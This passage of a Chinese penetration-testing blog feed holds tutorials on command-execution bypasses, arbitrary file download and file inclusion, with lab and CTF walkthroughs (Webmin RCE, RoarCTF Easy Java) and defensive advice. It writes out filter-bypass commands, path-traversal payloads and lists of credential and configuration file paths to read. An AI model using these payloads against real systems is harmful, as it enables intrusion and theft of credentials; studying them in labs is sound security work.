alt="image-20220804161658527"></p><p>看到该网站下有一个key开头的php文件，查看该文件内容（注意使用tac绕过对cat命令的过滤）：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804161852678.png" alt="image-20220804161852678"></p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ul><li><p>尽量不要使用命令执行函数</p></li><li><p>客户端提交的变量在进入执行命令函数方法之前，一定要做好过滤，对敏感字符进行转义</p></li><li><p>在使用动态函数之前，确保使用的函数是指定的函数之一</p></li><li><p>对PHP语言来说，不能完全控制的危险函数最好不要使用</p></li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>绕过对空格的检查：</p><p>比如<code>cat flag.txt</code>，要替换掉空格，且保持仍可执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$IFS$<span class="number">1</span>　　　　　　<span class="comment">//$1改成$加其他数字都行，都能当作空格来用</span></span><br><span class="line"></span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line"></span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line"></span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure><p>绕过关键词：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac flag.txt</span><br></pre></td></tr></table></figure><h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><ul><li><p><strong>代码审计</strong></p><p>最主要的方式，借助代码审计工具，非常方便的审计出此类漏洞</p></li><li><p><strong>已知的CMS漏洞</strong></p></li></ul><p>已知的CMS，有很多每年都会爆出来很多此类的漏洞</p><ul><li><p><strong>页面传参查找</strong></p><pre><code>  针对页面有传参的地方，重点关注传入恶意代码尝试，概率相对较低</code></pre></li></ul><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="墨者靶场黑盒层-RCE-漏洞检测-公开漏洞"><a href="#墨者靶场黑盒层-RCE-漏洞检测-公开漏洞" class="headerlink" title="墨者靶场黑盒层 RCE 漏洞检测-公开漏洞"></a>墨者靶场黑盒层 RCE 漏洞检测-公开漏洞</h3><p><strong>Webmin未经身份验证的远程代码执行</strong></p><p>Webmin是基于Web的Unix系统管理工具。为了降低 Linux系统的管理难度，有时候会对公司内的Linux主机或VPS系统预装了网页管理工具webmin。</p><p>Webmin的RCE漏洞存在于密码重置页面中。该页面允许未经身份验证的用户通过简单的POST请求执行任意命令。</p><p><a href="https://www.cnblogs.com/whoami101/p/11465877.html">https://www.cnblogs.com/whoami101/p/11465877.html</a></p><p>在注册界面提交后BP抓包，将post的URL改为<code>/password_change.cgi</code>（修改密码的URL），post请求主体改为old等参数。其中使用old参数作为命令执行的入口，令old&#x3D;{shell}：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/009994f56d66a163e07fa85f74ccc4c5737559ec.png@692w_365h_progressive.webp" alt="img"></p><p>这里old&#x3D;ls，所以输出了服务器的当前文件目录（这里是直接在浏览器F12调试中修改的数据包）：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804163823614.png" alt="image-20220804163823614"></p><p>然后令old&#x3D;&#x2F;key.txt读取文件，获得flag。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804164230310.png" alt="image-20220804164230310"></p><h3 id="Javaweb-Struts2-框架类-RCE-漏洞-漏洞层面"><a href="#Javaweb-Struts2-框架类-RCE-漏洞-漏洞层面" class="headerlink" title="Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面"></a>Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面</h3><p><strong>Apache Struts2远程代码执行漏洞（S2-037复现）</strong></p><p>Struts2漏洞检查工具2019版 V2.3 by shack2 20190927</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804190810468.png" alt="image-20220804190810468"></p><p>struts2漏洞扫描工具：<strong>Struts2-Scan</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#工具参数说明（Struts2批量扫描利用工具）：</span><br><span class="line"></span><br><span class="line">---Usage: Struts2Scan.py [OPTIONS]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -i, --info          漏洞信息介绍</span><br><span class="line">  -v, --version       显示工具版本</span><br><span class="line">  -u, --url TEXT      URL地址</span><br><span class="line">  -n, --name TEXT     指定漏洞名称, 漏洞名称详见info</span><br><span class="line">  -f, --file TEXT     批量扫描URL文件, 一行一个URL</span><br><span class="line">  -d, --data TEXT     POST参数, 需要使用的payload使用&#123;exp&#125;填充</span><br><span class="line">  -c, --encode TEXT   页面编码, 默认UTF-8编码</span><br><span class="line">  -p, --proxy TEXT    HTTP代理. 格式为http://ip:port</span><br><span class="line">  -t, --timeout TEXT  HTTP超时时间, 默认10s</span><br><span class="line">  -w, --workers TEXT  批量扫描进程数, 默认为10个进程</span><br><span class="line">  --header TEXT       HTTP请求头, 格式为: key1=value1&amp;key2=value2</span><br><span class="line">  -e, --exec          进入命令执行shell</span><br><span class="line">  --webpath           获取WEB路径</span><br><span class="line">  -r, --reverse TEXT  反弹shell地址, 格式为ip:port</span><br><span class="line">  --upfile TEXT       需要上传的文件路径和名称</span><br><span class="line">  --uppath TEXT       上传的目录和名称,如:/usr/local/tomcat/webapps/ROOT/shell.jsp</span><br><span class="line">  -q, --quiet         关闭打印不存在漏洞的输出，只保留存在漏洞的输出</span><br><span class="line">  -h, --help          Show this message and exit.</span><br></pre></td></tr></table></figure><p><strong>专业话语：</strong></p><p>EXP：Exploit漏洞利用代码，运行之后对目标进行攻击。<br>POC：Proof of Concept漏洞验证代码，检测目标是否存在对应漏洞。</p><h3 id="一句话-Webshell-后门原理代码执行-拓展说明"><a href="#一句话-Webshell-后门原理代码执行-拓展说明" class="headerlink" title="一句话 Webshell 后门原理代码执行-拓展说明"></a>一句话 Webshell 后门原理代码执行-拓展说明</h3><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804192441723.png" alt="image-20220804192441723"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804192548559.png" alt="image-20220804192548559"></p><p>菜刀将操作系统的命令写入参数，以post方式传递给网站后门，网站后门通过eval()代码执行来执行系统命令或者代码，从而达到了菜刀远程操作服务器的目的.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RCE-代码及命令执行漏洞&quot;&gt;&lt;a href=&quot;#RCE-代码及命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;RCE 代码及命令执行漏洞&quot;&gt;&lt;/a&gt;RCE 代码及命令执行漏洞&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件下载</title>
    <link href="https://frankcao3.github.io/posts/18452"/>
    <id>https://frankcao3.github.io/posts/18452</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.981Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804214515223.png" alt="image-20220804214515223"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>网站上文件下载功能的实现通常是通过对参数filename的值的对应，获取在服务器上所需下载的文件的绝对路径，然后读取文件内容并发送给客户端进行下载。</p><p>如果这些有下载功能的网站<strong>没有对前端用户的下载请求的文件类型、目录做合理严谨的规则进行过滤</strong>，导致用户<strong>通过路径回溯符<code>../</code>等相关操作，跳出了程序本身的限制目录</strong>，然后再利用文件下载功能，使前端下载请求可以下载服务器中的任意文件。</p><h3 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h3><p>网站给用户提供了下载文件的功能，并能接收相关的参数变量</p><p>后端使用了读取文件的相关函数</p><p>网站对前端用户读取文件的请求没有进行相应的控制或控制不严（限制、校验）</p><p>网站能输出请求文件的内容，提供给前端下载</p><h3 id="文件下载漏洞的挖掘"><a href="#文件下载漏洞的挖掘" class="headerlink" title="文件下载漏洞的挖掘"></a>文件下载漏洞的挖掘</h3><h4 id="寻找漏洞位置"><a href="#寻找漏洞位置" class="headerlink" title="寻找漏洞位置"></a>寻找漏洞位置</h4><p>找到有文件下载功能的网站：</p><ul><li><p>根据功能：一般可以根据下载功能去找，一些明显的软件下载网站等；</p></li><li><p>根据关键字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">download.php?path=</span><br><span class="line">download.php?file=</span><br><span class="line">down.xxx?filename=</span><br><span class="line">down.php?file=</span><br><span class="line"></span><br><span class="line">data.php?file=</span><br><span class="line">read.xxx?filename=</span><br><span class="line">readfile.php?file=</span><br><span class="line">read.php?filename=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&amp;ReadPath=</span><br><span class="line">&amp;FilePath=</span><br><span class="line">&amp;ﬁlepath=</span><br><span class="line">&amp;Filepath=</span><br><span class="line">&amp;Path=</span><br><span class="line">&amp;path=</span><br><span class="line">&amp;inputFile=</span><br><span class="line">&amp;Inputfile=</span><br><span class="line">&amp;url=</span><br><span class="line">&amp;urls=</span><br><span class="line">&amp;Lang=</span><br><span class="line">&amp;dis=</span><br><span class="line">&amp;data=</span><br><span class="line">&amp;Data=</span><br><span class="line">&amp;readﬁle=</span><br><span class="line">&amp;ﬁlep=</span><br><span class="line">&amp;src=</span><br><span class="line">&amp;menu=</span><br><span class="line">META-INF</span><br><span class="line">WEB-INF</span><br></pre></td></tr></table></figure><h4 id="分析下载链接中的参数变量"><a href="#分析下载链接中的参数变量" class="headerlink" title="分析下载链接中的参数变量"></a>分析下载链接中的参数变量</h4><p>一般要先解码。</p><p>比如<code>http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMTExMTcveXN0XzEuNC41X2RhbmdiZWkuYXBr</code></p><p>s的值经过base64解码后得到下载文件路径：<code>down/20211117/yst_1.4.5_dangbei.apk</code></p><p>然后看参数能否修改。</p><p><strong>linux的一些系统文件路径：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd            //保存了系统中所有的用户信息</span><br><span class="line">/etc/shadow            //用户的密码信息</span><br><span class="line">/root/.ssh/authorized_keys               //公钥文件</span><br><span class="line">/root/.bash_history                      //用户终端操作历史记录</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf   //apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf           //虚拟网站设置</span><br><span class="line">/usr/local/app/php5/lib/php.ini          //php相关设置</span><br><span class="line">/etc/httpd/conf/httpd.conf               //apache</span><br><span class="line">/etc/php5/apache2/php.ini                //ubuntu系统的默认路径</span><br></pre></td></tr></table></figure><p><strong>windows的一些系统文件路径：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini                //查看系统版本</span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml                //查看IIS虚拟主机配置文件</span><br><span class="line">C:\windows\repair\sam                 //存储Windows系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini         //mysql配置，记录管理员登陆过的MYSQL用户名和密码</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD                    //mysql.user表中的数据库连接密码</span><br><span class="line">C:\windows\php.ini php.ini                                    //php配置文件</span><br><span class="line">C:\Windows\system.ini                                         //winnt的php配置信息</span><br><span class="line">C:\Windows\win.ini                                            //winnt的mysql配置文件</span><br><span class="line">C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini         //存储虚拟主机网站路径和密码</span><br><span class="line">C:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf     //查看WINDOWS系统apache文件</span><br><span class="line">C:/Resin-3.0.14/conf/resin.conf                               //查看jsp开发的网站resin文件配置信息.</span><br><span class="line">C:\Windows\System32\drivers\etc\hostswinserver                //配置Telnet信息</span><br></pre></td></tr></table></figure><p><strong>tomcat的一些配置文件的路径：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apache-tomcat-8.5.51/conf/tomcat-users.xml              //tomcat的角色(授权用户)配置文件</span><br><span class="line">apache-tomcat-8.5.51/conf/server.xml                    //tomcat的主配置文件</span><br><span class="line">apache-tomcat-8.5.51/conf/web.xml                       //tomcat应用程序的部署描述符文件</span><br><span class="line">apache-tomcat-8.5.51/logs/catalina.out</span><br><span class="line">// 即tomcat的标准输出和标准出错，所有输出到这两个位置的都会进入catalina.out，这里包含tomcat运行自己输出的日志以及应用里向console输出的日志。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apache：</span><br><span class="line">    /etc/httpd/conf/httpd.conf</span><br><span class="line">    /etc/apache2/httpd.conf</span><br><span class="line">    /etc/apache2/apache2.conf</span><br><span class="line">nginx：</span><br><span class="line">    /etc/nginx/nginx.conf</span><br><span class="line">    /usr/local/nginx/conf/nginx.conf</span><br><span class="line">    /usr/local/etc/nginx/nginx.conf</span><br><span class="line">redis：</span><br><span class="line">    /etc/redis.conf</span><br><span class="line">    index.php?f=../../../../../../etc/passwd </span><br></pre></td></tr></table></figure><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p><strong>下载服务器的任意文件</strong>：</p><p>获得网站<strong>web源码</strong>，再对代码进行审计，以获得更多的漏洞</p><p>获得网站、服务器、系统、数据库等<strong>中间件配置文件</strong></p><p>获得应用的<strong>系统配置文件</strong></p><p><strong>内网探测</strong></p><p>下载各种.log文件，并寻找后台地址、文件上传点等地方</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>以pikachu为例：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811205457049.png" alt="image-20220811205457049"></p><h4 id="分析下载文件的URL"><a href="#分析下载文件的URL" class="headerlink" title="分析下载文件的URL"></a>分析下载文件的URL</h4><p>直接在网站上查看图片，可以知道图片在网站内的存储地址：<code>http://10.1.1.7/vul/unsafedownload/download/rayal.png</code></p><p>该图片的下载链接为：<code>http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=rayal.png</code></p><h4 id="测试能否下载其他文件"><a href="#测试能否下载其他文件" class="headerlink" title="测试能否下载其他文件"></a>测试能否下载其他文件</h4><p>通过上面的两个下载的地址我们可以可以测试文件下载漏洞：</p><p><code>http://10.1.1.7/vul/unsafedownload/execdownload.php?filename=../execdownload.php</code></p><p>根据上面的分析通过链接下载到了文件<code>execdownload.php</code>。</p><p>很明显filename参数这里存在文件下载漏洞。</p><h4 id="扫描网站目录"><a href="#扫描网站目录" class="headerlink" title="扫描网站目录"></a>扫描网站目录</h4><p>接下来可以使用御剑、铸剑等工具进行探针，看一看存在哪些敏感文件，构造我们所需要的下载链接：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811212858165.png" alt="image-20220811212858165"></p><h4 id="下载敏感文件进一步攻击"><a href="#下载敏感文件进一步攻击" class="headerlink" title="下载敏感文件进一步攻击"></a>下载敏感文件进一步攻击</h4><p>下载好的文件代码中去分析路径和文件包含。</p><p>举例：config.php配置文件—&gt;得到数据库密码—&gt;连接数据库</p><p><code>http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=../../inc/function.php</code></p><p>下载成功：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811212931057.png" alt="image-20220811212931057"></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li><p>净化数据：</p><p>对用户传过来的<strong>文件名参数进行统一编码</strong></p><p><strong>对文件类型进行白名单控制</strong></p><p>对包含恶意字符或者空字符的参数进行拒绝。比如**过滤.(点)**，使用户在url中不能回溯上级目录，正则严格判断用户输入参数的格式。</p></li><li><p>要下载的文件地址保存至数据库中，与网站目录隔开。</p></li><li><p>文件路径保存至数据库，让用户提交文件对应ID下载文件。</p></li><li><p>用户下载文件之前需要进行<strong>权限判断</strong>。</p></li><li><p>文件放在web无法直接访问的目录下。</p></li><li><p>不允许提供目录遍历服务。</p></li><li><p>公开文件可放置在web应用程序下载目录中通过链接进行下载。</p></li><li><p>php.ini配置open_basedir限定文件访问范围。</p></li></ol><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><a href="https://blog.csdn.net/m0_62619269/article/details/125043182">https://blog.csdn.net/m0_62619269/article/details/125043182</a></p><p><strong>[RoarCTF 2019]Easy Java</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812093558024.png" alt="image-20220812093558024"></p><p>登录界面尝试SQL注入，没有注入点，点击help：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812093722952.png" alt="image-20220812093722952"></p><ul><li><p><strong>分析文件下载URL</strong></p><p>URL中存在filename参数，推测可能存在文件下载漏洞。</p><p>该链接以get请求文件，但是失败，因为Java一般文件下载以post方式提交。</p><p>所以尝试用POST方式来进行请求，发现可以下载文件。下载了一个help.docx的文件。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812094228417.png" alt="image-20220812094228417"></p><ul><li><p><strong>尝试下载其他文件</strong></p><p>这里要用到 <strong>web-inf</strong> 的知识：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">这里对WEB-INF进行一个简单的了解。</span><br><span class="line"></span><br><span class="line">WEB-INF是java的WEB应用的安全目录。</span><br><span class="line">1.WEB-INF/web.xml:web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。</span><br><span class="line">2.WEB-INF/classes:包含了站点所有用的class文件，包括servlet class和非servlet class</span><br><span class="line">3.WEB-INF/lib:存放web应用需要的JAR文件</span><br><span class="line">4.WEB-INF/src:源码目录，按照包名结构放置各个java文件</span><br><span class="line">5.WEB-INF/database.properties:数据库配置文件</span><br><span class="line">6.WEB-INF/tags:存放了自定义标签文件</span><br><span class="line">7.WEB-INF/jsp:jsp 1.2 一下版本的文件存放位置。</span><br><span class="line">8.WEB-INF/jsp2:存放jsp2.0以下版本的文件。</span><br><span class="line">9.META-INF:相当于一个信息包。</span><br></pre></td></tr></table></figure><p>尝试将参数的值换为<code>WEB-INF/web.xml</code>，发现成功返回内容。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分析文件内容发现可疑class文件。</p><p>构造payload：<code>filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code>，下载FlagController.class。</p><p>下载后，文件内容中存在base64编码：</p><p><code>String flag = &quot;ZmxhZ3thNTkzMTBiMy1lZjkzLTQ5ODktOTVlMC0zYTQ2ZmZhMThiYjh9Cg==&quot;;</code></p><p>解码即可得到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件下载&quot;&gt;&lt;a href=&quot;#文件下载&quot; class=&quot;headerlink&quot; title=&quot;文件下载&quot;&gt;&lt;/a&gt;文件下载&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="https://frankcao3.github.io/posts/59563"/>
    <id>https://frankcao3.github.io/posts/59563</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628991158390-b5543660-8083-4e31-9a9d-16edbbf6a1f0.png" alt="img"></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>文件包含：</strong></p><p>文件包含即程序通过 <strong>包含函数</strong> 调用本地或远程文件，<strong>将文件内容作为脚本执行</strong>，以此来实现拓展功能。</p><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p><p><strong>文件包含漏洞原理</strong>:</p><p>文件包含漏洞是指<strong>当服务器php.ini文件中开启<code>allow_url_include</code>选项时</strong>，就可以通过PHP的某些特性函数，比如<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>，利用URL去动态包含文件，<strong>让当前页面去执行指定的另外一个文件中的代码内容</strong>。此时如果没有对文件来源进行严格审查，就会导致任意文件读取。黑客将很有可能让当前页面去执行超出 Web 目录中的文件，或者是 Web 目录中不希望被执行的敏感文件，甚至是远程服务器上的文件。</p><p>几乎所有的脚本语言中都提供文件包含的功能，但文件包含漏洞<strong>在 PHP 中居多</strong>，而在JSP、ASP、ASP.NET程序中非常少，甚至没有包含漏洞的存在。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件包含各个脚本代码</span></span><br><span class="line">ASP,PHP,JSP,ASPX等</span><br><span class="line"></span><br><span class="line">&lt;!-—<span class="comment">#include file=&quot;1.asp&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--<span class="comment">#include file=&quot;top.aspx&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;c:import url=<span class="string">&quot;http://lthief.one/1.jsp&quot;</span>&gt;    <span class="comment">// 远程文件包含</span></span><br><span class="line"></span><br><span class="line">&lt;jsp:<span class="keyword">include</span> page=<span class="string">&quot;head.jsp&quot;</span> / &gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ <span class="keyword">include</span> file=<span class="string">&quot;head.jsp&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span> (<span class="string">&#x27;test.php&#x27;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><ul><li><p><strong>白盒</strong></p><p>代码审计</p></li><li><p><strong>黑盒</strong></p><p>漏洞扫描工具；</p><p>公开漏洞；</p><p>手工查看参数值和功能点（看是不是接收一个文件名作为参数，或者该功能的实现会不会涉及include()之类的函数）。</p></li></ul><h2 id="PHP中常见包含文件的函数"><a href="#PHP中常见包含文件的函数" class="headerlink" title="PHP中常见包含文件的函数"></a>PHP中常见包含文件的函数</h2><h3 id="include"><a href="#include" class="headerlink" title="include()"></a>include()</h3><p>当使用该函数包含文件时，只有代码执行到<code>include()</code>函数时才将文件包含进来，发生错误时之给出一个警告，继续向下执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// http://127.0.0.1:8080/include.php?filename=index.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$filename=$_GET[&#x27;filename&#x27;];</span></span><br><span class="line"><span class="comment">include ( $filename.&quot; .html&quot; );  // 文件后缀名增加了一个HTML作为限制</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比如访问服务器本地1.txt的内容：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805084014410.png" alt="image-20220805084014410"></p><h3 id="include-once"><a href="#include-once" class="headerlink" title="include_once()"></a>include_once()</h3><p>功能与<code>include()</code>相同，区别在于<u>当重复调用同一文件时，程序只调用一次</u>。</p><h3 id="require"><a href="#require" class="headerlink" title="require()"></a>require()</h3><p><code>require()</code>与<code>include()</code>的区别在于require()执行如果发生错误，函数会输出<br>错误信息，并终止脚本的运行。</p><h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once()"></a>require_once()</h3><p>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>被包含的文件在<strong>服务器本地</strong>。</p><p><strong>利用条件：</strong></p><p><code>allow_url_include = On</code> </p><p>比如，以get请求实施文件包含攻击，查看服务器本地文件：<code>?page=a.php</code>、<code>?home=b.html</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 